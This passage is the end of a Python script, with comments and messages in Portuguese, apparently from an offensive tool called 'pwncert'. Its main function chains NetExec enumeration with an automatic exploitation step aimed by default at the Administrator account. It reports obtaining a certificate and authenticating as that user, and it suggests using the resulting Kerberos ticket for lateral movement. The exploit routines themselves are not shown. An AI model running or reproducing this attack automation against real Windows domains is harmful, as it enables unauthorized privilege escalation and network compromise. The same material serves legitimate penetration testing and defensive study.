            print("[!] Erro: -u/--username e -d/--domain são obrigatórios")
            return 1
        
        if not args.password and not args.hashes:
            print("[!] Erro: Forneça -p/--password ou -H/--hashes")
            return 1
        
        # Criar instância de autoexploração
        auto = AutoExploit(pwncert, debug=args.debug)
        
        # Step 1: Executar NetExec
        print("\n[STEP 1/3] Executando enumeração com NetExec...")
        success, nxc_output = auto.run_nxc_enum(args.target)
        
        if not success:
            print("[!] Falha na enumeração com NetExec")
            auto.save_log(args.log)
            return 1
        
        # Debug: mostrar output do NetExec se requisitado
        if args.debug:
            print("\n[DEBUG] Output do NetExec:")
            print(nxc_output[:500] + "..." if len(nxc_output) > 500 else nxc_output)
        
        # Step 2: Analisar e explorar
        print("\n[STEP 2/3] Analisando vulnerabilidades e iniciando exploração...")
        target_user = args.target_user if hasattr(args, 'target_user') else 'Administrator'
        exploit_success = auto.analyze_and_exploit(nxc_output, target_user)
        
        if exploit_success:
            print("\n" + "="*80)
            print("  ✓ EXPLORAÇÃO CONCLUÍDA COM SUCESSO!")
            print("="*80)
            print(f"\nCertificado obtido e autenticação realizada para: {target_user}")
            print(f"Você pode agora usar o ticket kirbi para movimentação lateral\n")
        else:
            print("\n[!] Exploração automática não conseguiu terminar")
            print("[*] Tente manualmente analisando as vulnerabilidades detectadas")
        
        # Step 3: Salvar log
        if args.log:
            print("\n[STEP 3/3] Salvando log...")
            auto.save_log(args.log)
        else:
            auto.save_log()
        
        return 0 if exploit_success else 1
    
    return 1


if __name__ == '__main__':
    sys.exit(main())
